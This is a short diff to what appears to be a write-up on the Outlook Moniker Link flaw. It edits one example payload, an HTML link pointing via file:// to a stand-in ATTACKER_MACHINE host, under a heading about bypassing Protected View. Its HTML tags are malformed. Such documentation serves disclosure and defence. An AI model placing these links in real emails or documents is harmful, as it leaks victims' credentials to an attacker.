@@ -20,7 +20,7 @@
 
 ### Example payload: (Moniker Link type: file://)
 
-#### 1) <p><a href="file://ATTACKER_MACHINE/test">Click me</a></p<
+#### 1) <p><a href="file://ATTACKER_MACHINE/test"<Click me</a></p<
 
 ### Outlook's Protected view bypass: (Special character: !)
 
